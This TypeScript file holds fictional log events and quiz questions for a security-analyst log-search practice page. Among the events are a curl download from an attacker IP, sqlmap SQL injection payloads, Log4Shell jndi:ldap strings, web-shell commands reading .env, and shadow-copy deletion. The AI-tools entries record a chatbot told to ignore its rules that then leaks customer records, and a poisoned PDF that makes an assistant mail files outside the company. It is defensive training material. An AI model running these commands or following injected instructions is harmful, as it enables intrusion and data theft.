// Sample logs for the Log search practice page. All fictional, and consistent with the alerts:
// the same hosts, users and addresses appear here as in the case evidence.
export type LogSource = "auth" | "proxy" | "firewall" | "waf" | "vpn" | "identity" | "endpoint" | "mail" | "ai";

export type LogEvent = {
  time: string;
  source: LogSource;
  host: string;
  user: string;
  src: string;
  dst: string;
  event: string;
  detail: string;
};

export const LOG_SOURCES: { id: LogSource; label: string; about: string }[] = [
  { id: "auth", label: "Auth", about: "Logins and sudo on servers" },
  { id: "proxy", label: "Proxy", about: "Web browsing and uploads" },
  { id: "firewall", label: "Firewall", about: "Allowed and blocked connections" },
  { id: "waf", label: "WAF", about: "Web requests to the customer portal" },
  { id: "vpn", label: "VPN", about: "Remote access connections" },
  { id: "identity", label: "Identity", about: "Single sign-on and MFA" },
  { id: "endpoint", label: "Endpoint", about: "Programs started on computers" },
  { id: "mail", label: "Mail", about: "Delivered email" },
  { id: "ai", label: "AI tools", about: "What company AI tools were asked and what they did" },
];

const out: LogEvent[] = [];
function e(time: string, source: LogSource, host: string, user: string, src: string, dst: string, event: string, detail: string) {
  out.push({ time, source, host, user, src, dst, event, detail });
}
const hms = (s: number) =>
  [Math.floor(s / 3600), Math.floor((s % 3600) / 60), s % 60].map((n) => String(n).padStart(2, "0")).join(":");

// ── auth: web-bastion-02 (alert SL-1003) ──
e("01:10:22", "auth", "web-bastion-02", "deploy", "10.20.9.30", "10.20.1.12", "ssh_login_ok", "Accepted publickey for deploy");
[
  ["02:41:07", "admin"],
  ["02:41:09", "admin"],
  ["02:41:11", "root"],
  ["02:41:13", "test"],
].forEach(([t, u]) => e(t, "auth", "web-bastion-02", u, "203.0.113.58", "10.20.1.12", "ssh_login_failed", `Failed password for ${u}`));
const guess = ["admin", "root", "test", "ubuntu"];
for (let i = 0; i < 21; i++) {
  const u = guess[i % 4];
  e(hms(9680 + i * 6), "auth", "web-bastion-02", u, "203.0.113.58", "10.20.1.12", "ssh_login_failed", `Failed password for ${u}`);
}
e("02:43:58", "auth", "web-bastion-02", "admin", "203.0.113.58", "10.20.1.12", "ssh_login_ok", "Accepted password for admin");
e("02:44:31", "auth", "web-bastion-02", "admin", "-", "198.51.100.77", "sudo_command", "COMMAND=/usr/bin/curl -O http://198.51.100.77/update.sh");
e("08:30:12", "auth", "web-bastion-02", "p.sharma", "10.20.9.31", "10.20.1.12", "ssh_login_failed", "Failed password for p.sharma");
e("08:30:19", "auth", "web-bastion-02", "p.sharma", "10.20.9.31", "10.20.1.12", "ssh_login_failed", "Failed password for p.sharma");
e("08:30:31", "auth", "web-bastion-02", "p.sharma", "10.20.9.31", "10.20.1.12", "ssh_login_ok", "Accepted password for p.sharma");

// ── auth + endpoint: db-prod-01 (alert SL-1013) ──
e("03:19:06", "auth", "db-prod-01", "d.rossi", "10.20.50.14", "10.20.3.11", "logon_ok", "Event 4624 type 10 (remote desktop)");
e("03:21:40", "endpoint", "db-prod-01", "d.rossi", "-", "-", "process_start", "net stop MSSQLSERVER");
e("03:22:10", "endpoint", "db-prod-01", "d.rossi", "-", "-", "process_start", "net start MSSQLSERVER");
e("03:29:55", "auth", "db-prod-01", "d.rossi", "10.20.50.14", "10.20.3.11", "logoff", "Event 4634");

// ── vpn ──
e("03:17:48", "vpn", "vpn-in-01", "d.rossi", "198.51.100.88", "10.20.50.14", "vpn_connect", "MFA=approved device=LAP-PUN-117");
e("08:21:05", "vpn", "vpn-in-01", "k.iyer", "198.51.100.120", "10.20.50.21", "vpn_connect", "MFA=approved device=LAP-MUM-044");
e("08:47:33", "vpn", "vpn-in-01", "r.dsouza", "198.51.100.131", "10.20.50.22", "vpn_connect", "MFA=approved device=LAP-PUN-190");
e("14:12:30", "vpn", "vpn-eu-01", "s.menon", "198.51.100.34", "192.0.2.150", "vpn_connect", "device=LAP-PUN-208 exit=192.0.2.150");

// ── firewall: scanner (SL-1004) and beaconing (SL-1005) ──
[
  ["03:00:04", "10.20.4.11", 22],
  ["03:00:04", "10.20.4.11", 80],
  ["03:00:04", "10.20.4.11", 443],
  ["03:00:05", "10.20.4.12", 22],
  ["03:00:05", "10.20.4.12", 445],
  ["03:00:06", "10.20.4.13", 3389],
  ["03:00:06", "10.20.4.13", 80],
  ["03:00:07", "10.20.5.20", 22],
].forEach(([t, d, p], i) =>
  e(String(t), "firewall", "fw-01", "-", "10.20.9.5", String(d), "allow", `ALLOW tcp 10.20.9.5:${44100 + i} -> ${d}:${p}`),
);
for (let k = 0; k < 131; k++) {
  e(hms(25331 + k * 60), "firewall", "fw-01", "-", "10.20.6.114", "198.51.100.200", "deny", `DENY tcp 10.20.6.114:${50211 + k * 3} -> 198.51.100.200:443 (threat-feed: botnet-c2)`);
}
e("06:58:30", "endpoint", "FIN-WS-114", "r.nair", "-", "-", "process_start", "invoice_viewer.exe (unsigned) from C:\\Users\\r.nair\\Downloads");
e("06:49:10", "mail", "mail-gw-01", "r.nair", "192.0.2.44", "r.nair@harborpine.test", "mail_delivered", "From unknown sender, subject 'Invoice 8841', attachment Invoice_8841.zip");

// ── mail and proxy: phishing (SL-1001, SL-1002) ──
e("09:12:03", "mail", "mail-gw-01", "d.okafor", "203.0.113.140", "d.okafor@harborpine.test", "mail_delivered", "From payroll-update@harborpine-hr.test SPF=fail DKIM=none, link harborpine-hr.test/login/verify");
e("09:12:05", "mail", "mail-gw-01", "f.reyes", "203.0.113.140", "f.reyes@harborpine.test", "mail_delivered", "From payroll-update@harborpine-hr.test SPF=fail DKIM=none");
e("10:03:00", "mail", "mail-gw-01", "m.silva", "192.0.2.61", "m.silva@harborpine.test", "mail_delivered", "From news@freightline-news.test SPF=pass DKIM=pass, 1 link");
e("09:14:02", "proxy", "proxy-01", "d.okafor", "10.20.4.37", "harborpine-hr.test", "http_get", "GET https://harborpine-hr.test/login/verify?u=d.okafor 200 text/html");
e("09:14:41", "proxy", "proxy-01", "d.okafor", "10.20.4.37", "harborpine-hr.test", "http_post", "POST https://harborpine-hr.test/login/verify 200 text/html");
[
  ["08:45:10", "p.sharma", "10.20.9.31", "wiki.harborpine.test", "GET /onboarding"],
  ["08:52:44", "d.okafor", "10.20.4.37", "erp.harborpine.test", "GET /payments"],
  ["09:30:05", "m.silva", "10.20.4.52", "carrier-hub.test", "GET /rates"],
  ["10:15:21", "k.iyer", "10.20.9.33", "docs.harborpine.test", "GET /policies/travel"],
  ["10:48:09", "f.reyes", "10.20.4.40", "news.test", "GET /logistics"],
  ["11:20:30", "r.dsouza", "10.20.9.34", "wiki.harborpine.test", "GET /runbooks"],
  ["13:10:00", "m.silva", "10.20.4.52", "docs.harborpine.test", "GET /templates"],
  ["15:42:18", "k.iyer", "10.20.9.33", "carrier-hub.test", "GET /tracking"],
].forEach(([t, u, s, d, req]) => e(t, "proxy", "proxy-01", u, s, d, "http_get", `${req} 200 text/html`));

// ── proxy + endpoint + mail: malicious CV (SL-1006) and training file (SL-1007) ──
e("10:31:00", "mail", "mail-gw-01", "l.fernandes", "192.0.2.77", "l.fernandes@harborpine.test", "mail_delivered", "From applicant.cv@jobseek-mail.test SPF=softfail, attachment Candidate_CV_Final.docm");
e("10:31:02", "endpoint", "HR-WS-052", "l.fernandes", "-", "-", "process_start", "OUTLOOK.EXE opened attachment");
e("10:31:40", "endpoint", "HR-WS-052", "l.fernandes", "-", "-", "process_start", "WINWORD.EXE Candidate_CV_Final.docm");
e("10:31:44", "endpoint", "HR-WS-052", "l.fernandes", "-", "-", "process_start", "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcA... (parent WINWORD.EXE)");
e("10:31:47", "proxy", "proxy-01", "l.fernandes", "10.20.7.52", "192.0.2.88", "http_connect", "CONNECT 192.0.2.88:443 200");
e("10:31:49", "proxy", "proxy-01", "l.fernandes", "10.20.7.52", "192.0.2.88", "http_get", "GET https://192.0.2.88/s/stage2.bin 200 application/octet-stream 412 KB");
e("11:46:12", "endpoint", "SEC-LAB-03", "t.brandt", "-", "-", "av_detection", "EICAR-Test-File quarantined, C:\\Training\\eicar.com.txt");

// ── waf: SQL injection (SL-1008) ──
[
  ["13:05:41", "' OR 1=1--"],
  ["13:05:43", "' UNION SELECT username,password FROM users--"],
  ["13:05:46", "1; DROP TABLE shipments--"],
  ["13:05:49", "' OR 'a'='a"],
  ["13:05:55", "admin'--"],
  ["13:06:02", "' AND 1=CONVERT(int,@@version)--"],
  ["13:06:10", "' OR SLEEP(5)--"],
  ["13:06:19", "1' ORDER BY 10--"],
  ["13:06:27", "' UNION SELECT NULL,NULL--"],
  ["13:06:36", "%27%20OR%201%3D1--"],
  ["13:06:44", "' OR 1=1#"],
  ["13:06:52", "1 AND (SELECT COUNT(*) FROM users)>0--"],
  ["13:07:01", "' HAVING 1=1--"],
  ["13:07:10", "'; WAITFOR DELAY '0:0:5'--"],
].forEach(([t, q]) => e(t, "waf", "waf-01", "-", "203.0.113.91", "portal.harborpine.test", "blocked", `GET /portal/search?q=${q} rule=942100 status=403 ua=sqlmap/1.7`));
[
  ["13:04:12", "198.51.100.61", "container 8841"],
  ["13:05:02", "198.51.100.62", "pallet rates"],
  ["13:05:50", "198.51.100.63", "SL-20931"],
  ["13:06:31", "198.51.100.64", "customs form"],
  ["13:07:44", "198.51.100.65", "delivery window"],
].forEach(([t, s, q]) => e(t, "waf", "waf-01", "-", s, "portal.harborpine.test", "allowed", `GET /portal/search?q=${q} status=200 size=2.4KB`));

// ── identity: impossible travel (SL-1009), MFA fatigue (SL-1010), takeover (SL-1014) ──
e("14:02:11", "identity", "idp-01", "s.menon", "198.51.100.34", "-", "signin_ok", "Pune, IN. Web (Chrome), device LAP-PUN-208, MFA passed");
e("14:14:25", "identity", "idp-01", "s.menon", "192.0.2.150", "-", "signin_ok", "Frankfurt, DE. Web (Chrome), device LAP-PUN-208, MFA passed");
[
  ["22:41:05", "no response"],
  ["22:42:10", "denied by user"],
  ["22:43:20", "no response"],
  ["22:44:30", "no response"],
  ["22:45:40", "denied by user"],
  ["22:46:50", "no response"],
  ["22:47:15", "no response"],
  ["22:47:50", "no response"],
  ["22:48:20", "approved by user"],
].forEach(([t, r]) => e(t, "identity", "idp-01", "a.kapoor", "203.0.113.210", "-", "mfa_prompt", `Amsterdam, NL. Unknown device. Result: ${r}`));
e("08:52:07", "identity", "idp-01", "d.okafor", "10.20.4.37", "-", "signin_ok", "Office, Pune. Web (Chrome), MFA passed");
e("11:04:20", "identity", "idp-01", "d.okafor", "203.0.113.140", "-", "signin_ok", "Unknown location. IMAP (legacy protocol), MFA not required");
[
  ["08:58:12", "k.iyer", "10.20.9.33"],
  ["09:03:40", "r.dsouza", "10.20.9.34"],
  ["09:20:18", "f.reyes", "10.20.4.40"],
  ["09:41:55", "m.silva", "10.20.4.52"],
  ["10:02:09", "p.sharma", "10.20.9.31"],
  ["13:55:30", "j.mercer", "10.20.8.31"],
].forEach(([t, u, s]) => e(t, "identity", "idp-01", u, s, "-", "signin_ok", "Office, Pune. Web (Chrome), MFA passed"));

// ── proxy: large upload (SL-1012) ──
e("17:55:02", "proxy", "proxy-01", "j.mercer", "10.20.8.31", "docs.harborpine.test", "http_get", "GET /sales/pricing 200 text/html");
e("18:05:12", "proxy", "proxy-01", "j.mercer", "10.20.8.31", "filedrop-personal.test", "http_post", "POST https://filedrop-personal.test/upload 200 sent 212 MB");
e("18:19:40", "proxy", "proxy-01", "j.mercer", "10.20.8.31", "filedrop-personal.test", "http_post", "POST https://filedrop-personal.test/upload 200 sent 640 MB");
e("18:41:03", "proxy", "proxy-01", "j.mercer", "10.20.8.31", "filedrop-personal.test", "http_post", "POST https://filedrop-personal.test/upload 200 sent 948 MB");

// ── warehouse takeover (SL-1015), PsExec patching (SL-1016), fake sign-in page (SL-1017) ──
e("02:00:03", "identity", "warehouse-idp", "svc_bi_report", "10.20.3.40", "-", "signin_ok", "Warehouse sign-in. BI connector, password only (service account, no MFA)");
e("18:51:40", "identity", "warehouse-idp", "svc_bi_report", "203.0.113.166", "-", "signin_ok", "Warehouse sign-in. Command-line client not seen before, password only (service account, no MFA)");
e("18:56:02", "firewall", "fw-edge-01", "svc_bi_report", "203.0.113.166", "files-transit.test", "allowed", "Warehouse export stage connection, 205 MB sent");
e("01:11:58", "endpoint", "JUMP-ADM-01", "svc-patch", "10.20.9.20", "-", "process_start", "powershell.exe started by Task Scheduler, task 'Oct-OOB-Patch'");
e("01:12:03", "endpoint", "JUMP-ADM-01", "svc-patch", "10.20.9.20", "-", "process_start", "PsExec64.exe @fs-servers.txt wusa.exe kb5044-oct.msu, signed by Microsoft");
e("01:12:10", "auth", "FS-01", "svc-patch", "10.20.9.20", "10.20.9.101", "logon_ok", "Network logon (type 3) by svc-patch from JUMP-ADM-01");
e("01:16:20", "endpoint", "FS-01", "svc-patch", "10.20.9.20", "-", "process_start", "PSEXESVC service removed after patch installed");
e("10:38:05", "mail", "mail-gw-01", "p.sharma", "192.0.2.201", "p.sharma@harborpine.test", "delivered", "From share@harborpine-sso.test, subject 'Shared with you: Q4 supplier contracts'");
e("10:41:12", "proxy", "proxy-01", "p.sharma", "10.20.9.31", "harborpine-sso.test", "http_get", "GET https://harborpine-sso.test/auth/signin 200");
e("10:43:21", "proxy", "proxy-01", "p.sharma", "10.20.9.31", "harborpine-sso.test", "blocked", "GET https://harborpine-sso.test/auth/signin BLOCKED (Phishing category)");
e("10:47:02", "proxy", "proxy-01", "f.reyes", "10.20.4.40", "harborpine-sso.test", "blocked", "GET https://harborpine-sso.test/auth/signin BLOCKED (Phishing category)");

// ── Beginner additions: stale phone password (SL-1018), fake installer (SL-1019), web shell (SL-1020) ──
e("08:37:02", "identity", "idp-01", "r.dsouza", "10.20.30.115", "-", "signin_failed", "iPhone Mail (ActiveSync). Bad password");
e("08:37:32", "identity", "idp-01", "r.dsouza", "10.20.30.115", "-", "signin_failed", "iPhone Mail (ActiveSync). Bad password");
e("08:44:03", "identity", "idp-01", "r.dsouza", "10.20.30.115", "-", "signin_failed", "iPhone Mail (ActiveSync). Bad password. Account locked out (14th failure)");
e("11:24:50", "proxy", "proxy-01", "m.pillai", "10.20.8.19", "zoom-installer-download.test", "http_get", "GET /ZoomWorkspace_Setup.exe 200 sent 2.1 MB");
e("11:25:02", "endpoint", "MKT-WS-019", "m.pillai", "10.20.8.19", "-", "av_detect", "Trojan.Win32.Stealer.gen in Downloads\\ZoomWorkspace_Setup.exe, quarantined and deleted");
e("15:31:09", "waf", "waf-01", "-", "198.51.100.141", "portal.harborpine.test", "allowed", "POST /portal/profile/upload status=200 file=avatar.php");
e("15:33:40", "waf", "waf-01", "-", "198.51.100.141", "portal.harborpine.test", "allowed", "GET /uploads/avatars/9f3a.php?c=id status=200");
e("15:36:20", "waf", "waf-01", "-", "198.51.100.141", "portal.harborpine.test", "allowed", "GET /uploads/avatars/9f3a.php?c=cat .env status=200 size=612B");

// ── Hard additions, first five: stolen session (SL-1021), file transfer web shell (SL-1022), Log4Shell scan (SL-1023), help desk reset (SL-1024), gateway pilot (SL-1025) ──
e("13:46:03", "identity", "idp-01", "t.venkat", "203.0.113.178", "-", "session_reuse", "Session s-8841 used from a second address. python-requests/2.31. No sign-in, no MFA prompt");
e("13:49:02", "identity", "idp-01", "t.venkat", "203.0.113.178", "-", "admin_action", "Session s-8841: CreateUser svc-sso-sync");
e("13:50:15", "identity", "idp-01", "t.venkat", "203.0.113.178", "-", "admin_action", "Session s-8841: AssignRole svc-sso-sync to Super Admin");
e("08:57:12", "identity", "idp-01", "t.venkat", "10.20.4.22", "-", "signin_ok", "Session s-8841 started. Pune office laptop, password and MFA passed");
e("02:11:37", "waf", "xfer-01", "-", "203.0.113.87", "xfer-01", "allowed", "POST /guestaccess.aspx status=200 body=9.9KB");
e("02:14:42", "waf", "xfer-01", "-", "203.0.113.87", "xfer-01", "allowed", "GET /guest2.aspx status=200 header X-Pass present");
e("02:18:10", "firewall", "fw-edge-01", "-", "203.0.113.87", "xfer-01", "allowed", "TCP 443, 6.4 GB sent from the server by 02:41:30");
e("02:18:12", "endpoint", "xfer-db-01", "xfer_app", "10.20.1.40", "-", "db_read", "SELECT * FROM FileBlob in 1,408 batches, 41,220 rows");
e("14:02:11", "waf", "waf-01", "-", "198.51.100.208", "portal-web", "blocked", "User-Agent contains jndi:ldap://203.0.113.45:1389/a");
e("14:03:19", "waf", "waf-01", "-", "198.51.100.208", "api-gw-02", "allowed", "User-Agent contains jndi:ldap://203.0.113.45:1389/a (monitor-only policy)");
e("14:04:30", "waf", "waf-01", "-", "198.51.100.208", "hr-app-01", "blocked", "User-Agent contains jndi:ldap://203.0.113.45:1389/a");
e("07:50:12", "identity", "idp-01", "a.menon", "10.20.2.18", "-", "password_reset", "Reset by r.nair (help desk), ticket INC-5588");
e("07:55:30", "identity", "idp-01", "a.menon", "192.0.2.64", "-", "signin_ok", "New device, password only. Hosting provider address");
e("07:56:44", "identity", "idp-01", "a.menon", "192.0.2.64", "-", "mfa_added", "Authenticator app registered");
e("08:14:45", "identity", "idp-01", "a.menon", "192.0.2.64", "-", "app_action", "Finance portal: bank detail change requested for Northwind Freight");
e("09:11:08", "identity", "idp-01", "s.nair", "10.20.9.40", "-", "signin_ok", "Pune office, device dev-7731, MFA passed");
e("09:15:22", "identity", "idp-01", "s.nair", "192.0.2.140", "-", "signin_ok", "Frankfurt (EdgeShield gateway), device dev-7731, MFA satisfied by device claim");

// ── Hard additions, second five: trojanized update (SL-1026), ransomware (SL-1027), leaked key (SL-1028), consent phishing (SL-1029), DNS lookups (SL-1030) ──
e("08:02:05", "endpoint", "SALES-WS-027", "j.kapoor", "10.20.8.27", "-", "process_start", "CallBridge.exe started rundll32.exe vxcore2.dll,Init");
e("08:02:11", "endpoint", "SALES-WS-027", "j.kapoor", "10.20.8.27", "-", "process_start", "rundll32.exe started cmd.exe /c systeminfo & whoami /all");
e("08:03:42", "proxy", "proxy-01", "j.kapoor", "10.20.8.27", "api-voxline-cdn.test", "http_post", "POST /v1/telemetry 200 sent 1.2 KB");
e("08:05:12", "proxy", "proxy-01", "r.menon", "10.20.8.31", "api-voxline-cdn.test", "http_post", "POST /v1/telemetry 200 sent 1.1 KB");
e("08:06:30", "proxy", "proxy-01", "t.fernandes", "10.20.8.14", "api-voxline-cdn.test", "http_post", "POST /v1/telemetry 200 sent 1.0 KB");
e("02:48:10", "vpn", "vpn-01", "adm.rkulkarni", "203.0.113.12", "-", "vpn_login", "Login from an address never seen for this account. Legacy profile, no MFA prompt");
e("03:29:48", "auth", "FS-02", "adm.rkulkarni", "10.20.7.88", "10.20.1.50", "network_logon", "Network logon from HR-WS-088, then PSEXESVC started");
e("03:30:44", "endpoint", "FS-02", "adm.rkulkarni", "10.20.7.88", "-", "process_start", "cmd.exe /c vssadmin delete shadows /all /quiet");
e("03:31:20", "endpoint", "FS-02", "SYSTEM", "10.20.1.50", "-", "process_start", "C:\\\\Windows\\\\Temp\\\\lk.exe started (unsigned). Files in \\\\\\\\FS-02\\\\Finance renamed to .h9p2k");
e("11:02:10", "identity", "cloud-audit", "svc-deploy-ci", "203.0.113.99", "-", "cloud_call", "GetCallerIdentity in eu-north-1 with key ending 7Q3M. First time from this address");
e("11:04:03", "identity", "cloud-audit", "svc-deploy-ci", "203.0.113.99", "-", "cloud_call", "RunInstances 8 x g5.12xlarge in eu-north-1");
e("11:05:41", "identity", "cloud-audit", "svc-deploy-ci", "203.0.113.99", "-", "cloud_call", "CreateUser backup-ops2 and AttachUserPolicy AdministratorAccess");
e("10:21:07", "identity", "idp-01", "p.rao", "10.20.5.31", "-", "app_consent", "Consent to DocuViewer Pro (unverified): mail read and send, files read, offline access");
e("10:23:05", "identity", "idp-01", "p.rao", "198.51.100.188", "-", "app_activity", "DocuViewer Pro listed messages in the mailbox. 2,140 read by 10:54");
e("10:40:12", "mail", "mail-gw", "p.rao", "198.51.100.188", "-", "mail_sent", "DocuViewer Pro sent 12 messages from p.rao to her contacts");
e("13:02:11", "endpoint", "LEG-WS-012", "n.joshi", "10.20.6.12", "lookup.shieldsense-cloud.test", "dns_query", "TXT query by ShieldSenseSvc.exe, 52-character name, answer 118 bytes. 9,214 in the hour");

// ── AI Era additions, first four: chatbot (SL-1031), deepfake call (SL-1032), invoice phishing (SL-1033), approved AI workspace (SL-1034) ──
e("14:58:02", "ai", "helppine-bot", "HP-9034", "198.51.100.231", "-", "chat_message", "Session 88213: visitor asks to check a delivery");
e("14:59:31", "ai", "helppine-bot", "HP-9034", "198.51.100.231", "-", "chat_message", "Session 88213: visitor tells the bot to ignore its earlier rules and enter maintenance mode");
e("14:59:36", "ai", "helppine-bot", "HP-9034", "198.51.100.231", "-", "tool_call", "lookup_shipments acct=HP-4417 returned 3 records, session 88213");
e("15:00:15", "ai", "helppine-bot", "HP-9034", "198.51.100.231", "-", "tool_call", "lookup_shipments acct=HP-4400 returned 2 records, session 88213");
e("15:04:40", "ai", "helppine-bot", "HP-9034", "198.51.100.231", "-", "tool_call", "lookup_shipments acct=HP-4440 returned 4 records. 41 accounts and 112 records in total, session 88213");
e("14:10:04", "mail", "mail-gw", "r.deshmukh", "203.0.113.141", "r.deshmukh@harborpine.test", "mail_delivered", "From v.malhotra@harborpine-pay.test, subject 'Invoice HP-INV-7731 - confidential, pay today'. SPF pass for harborpine-pay.test");
e("11:02:15", "mail", "mail-gw", "d.kamath", "203.0.113.30", "d.kamath@harborpine.test", "mail_delivered", "From accounts@brightwell-ledger.test, subject 'Invoice HP-5532 overdue - remittance details attached'. SPF, DKIM and DMARC pass");
e("11:09:12", "proxy", "proxy-01", "d.kamath", "10.20.9.31", "docs-brightwell-ledger.test", "http_get", "GET /view?id=a81f 200");
e("11:09:55", "proxy", "proxy-01", "d.kamath", "10.20.9.31", "docs-brightwell-ledger.test", "http_post", "POST /login 200 (form submitted)");
e("11:14:03", "proxy", "proxy-01", "n.dsouza", "10.20.9.44", "docs-brightwell-ledger.test", "http_get", "GET /view?id=c07d 200");
e("11:20:40", "proxy", "proxy-01", "t.pillai", "10.20.9.52", "docs-brightwell-ledger.test", "http_get", "GET /view?id=5e92 200");
e("11:24:18", "identity", "idp-01", "d.kamath", "203.0.113.118", "-", "sign_in", "Sign-in from a hosting provider in Amsterdam. MFA satisfied by a session token from 11:09");
e("11:31:44", "mail", "mail-gw", "d.kamath", "203.0.113.118", "-", "mailbox_rule", "Rule created: move messages containing 'invoice' or 'payment' to RSS Subscriptions and mark read");
e("11:33:20", "mail", "mail-gw", "d.kamath", "203.0.113.118", "-", "mail_sent", "6 emails sent to vendors asking them to confirm updated bank details");
e("12:14:20", "proxy", "proxy-01", "s.rajan", "10.20.6.19", "harborpine.lumen-workspace.test", "http_post", "POST /upload 200 customer-churn-q3.csv 212 KB, company tenant, signed in with single sign-on");
e("10:41:07", "proxy", "proxy-01", "v.dutta", "10.20.6.22", "harborpine.lumen-workspace.test", "http_post", "POST /upload 200 renewals-oct.xlsx 148 KB, company tenant");
e("11:26:50", "proxy", "proxy-01", "p.koshy", "10.20.6.27", "harborpine.lumen-workspace.test", "http_post", "POST /upload 200 account-health.csv 96 KB, company tenant");

// ── AI Era additions, second four: stolen AI key (SL-1035), poisoned document (SL-1036), shape-shifting files (SL-1037), AI add-on (SL-1038) ──
e("10:12:40", "ai", "model-api", "svc-ds-summariser", "203.0.113.250", "-", "api_call", "ListModels with key ending 4F9A. First use from this address");
e("10:12:41", "ai", "model-api", "svc-ds-summariser", "203.0.113.250", "-", "api_call", "GetLoggingConfiguration: checks whether prompts are recorded");
e("10:13:05", "ai", "model-api", "svc-ds-summariser", "203.0.113.250", "-", "api_call", "InvokeModel largest model, 4,000 tokens in, 4,000 out");
e("11:02:11", "ai", "model-api", "svc-ds-summariser", "198.51.100.17", "-", "api_call", "InvokeModel largest model, 3,800 tokens in, 4,000 out. Address not seen before");
e("12:47:30", "ai", "model-api", "svc-ds-summariser", "192.0.2.97", "-", "api_call", "InvokeModel second largest model, role-play prompt, 4,000 tokens out");
e("09:12:44", "mail", "mail-gw", "m.sharma", "198.51.100.40", "m.sharma@harborpine.test", "mail_delivered", "From sales@eastgate-freight.test, subject 'Rate card Q4', attachment Rate card Q4.pdf");
e("09:40:15", "ai", "pineassist", "m.sharma", "10.20.5.41", "-", "tool_call", "read_file Rate card Q4.pdf for the user's request to summarise it");
e("09:40:31", "ai", "pineassist", "m.sharma", "10.20.5.41", "-", "tool_call", "search_mail 'contract' returned 20 results");
e("09:41:02", "ai", "pineassist", "m.sharma", "10.20.5.41", "docsync-archive.test", "tool_call", "send_mail to reports@docsync-archive.test, 3 attachments, user not asked to confirm");
e("09:58:21", "ai", "pineassist", "k.rana", "10.20.5.47", "docsync-archive.test", "tool_call", "send_mail to reports@docsync-archive.test, 2 attachments, after reading Rate card Q4.pdf");
e("13:02:10", "mail", "mail-gw", "a.chawla", "203.0.113.64", "a.chawla@harborpine.test", "mail_delivered", "From docs@freightdocs-portal.test, subject 'Shipment documents for review', attachment .doc, one of six copies");
e("13:08:02", "endpoint", "FIN-WS-044", "r.nambiar", "10.20.3.44", "-", "process_start", "OUTLOOK.EXE opened Shipment-docs-7754.doc");
e("13:08:05", "endpoint", "FIN-WS-044", "r.nambiar", "10.20.3.44", "-", "process_start", "WINWORD.EXE started wscript.exe running a script from the user's Temp folder");
e("13:08:07", "endpoint", "FIN-WS-044", "r.nambiar", "10.20.3.44", "-", "process_start", "wscript.exe started powershell.exe with a hidden window and an encoded command. EDR blocked it and ended the chain");
e("13:15:20", "endpoint", "FIN-WS-051", "a.chawla", "10.20.3.51", "-", "process_start", "WINWORD.EXE started wscript.exe, then powershell.exe. EDR blocked it and ended the chain");
e("14:02:41", "proxy", "proxy-01", "l.gupta", "10.20.3.61", "api.sumly-ai.test", "http_post", "POST /v1/collect 200 18 KB, page text from erp.harborpine.test/payments/batch/7731");
e("14:02:58", "proxy", "proxy-01", "l.gupta", "10.20.3.61", "api.sumly-ai.test", "http_post", "POST /v1/collect 200 22 KB, page text from the bank payment portal");
e("14:11:09", "proxy", "proxy-01", "r.nambiar", "10.20.3.44", "api.sumly-ai.test", "http_post", "POST /v1/collect 200 15 KB, page text from erp.harborpine.test/suppliers/118");

export const LOGS: LogEvent[] = out.sort((a, b) => a.time.localeCompare(b.time));

export type LogQuestion = { id: string; level: "Easy" | "Medium"; question: string; tryQuery: string };

// Answers live in content/log-answers.ts and are checked on the server.
export const LOG_QUESTIONS: LogQuestion[] = [
  { id: "q1", level: "Easy", question: "How many failed SSH logins did 203.0.113.58 make against web-bastion-02?", tryQuery: "src:203.0.113.58 event:failed" },
  { id: "q2", level: "Easy", question: "Which account logged in successfully from 203.0.113.58?", tryQuery: "src:203.0.113.58 event:ok" },
  { id: "q3", level: "Easy", question: "At what time did the web application firewall first block a request from 203.0.113.91?", tryQuery: "source:waf src:203.0.113.91" },
  { id: "q4", level: "Medium", question: "Which internal workstation kept trying to reach 198.51.100.200?", tryQuery: "dst:198.51.100.200" },
  { id: "q5", level: "Medium", question: "How many MFA prompts did a.kapoor receive?", tryQuery: "user:a.kapoor event:mfa" },
  { id: "q6", level: "Medium", question: "Which website did d.okafor's workstation send a POST request to?", tryQuery: "user:d.okafor event:post" },
  { id: "q7", level: "Medium", question: "Which public IP did d.rossi connect to the VPN from?", tryQuery: "source:vpn user:d.rossi" },
  { id: "q8", level: "Medium", question: "One address appears on the phishing email delivered to d.okafor and on a later sign-in to the same account. Which address?", tryQuery: "user:d.okafor" },
];
